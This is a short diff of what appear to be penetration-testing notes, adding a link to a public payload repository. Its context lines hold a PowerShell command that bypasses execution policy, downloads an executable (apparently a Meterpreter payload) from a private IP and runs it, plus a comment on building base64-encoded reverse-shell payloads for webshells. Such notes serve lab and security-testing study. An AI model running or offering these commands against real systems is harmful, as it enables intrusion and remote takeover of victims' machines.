@@ -1,5 +1,6 @@
 powershell -ep bypass -c "iwr -uri http://192.168.45.151:8000/met.exe -outfile met.exe; .\met.exe"
 
+https://github.com/swisskyrepo/PayloadsAllTheThings
 
 # Will create a reverse shell payload in powershell as a string, then will encode to base64 and print it on the screen, to use with webshells.
 
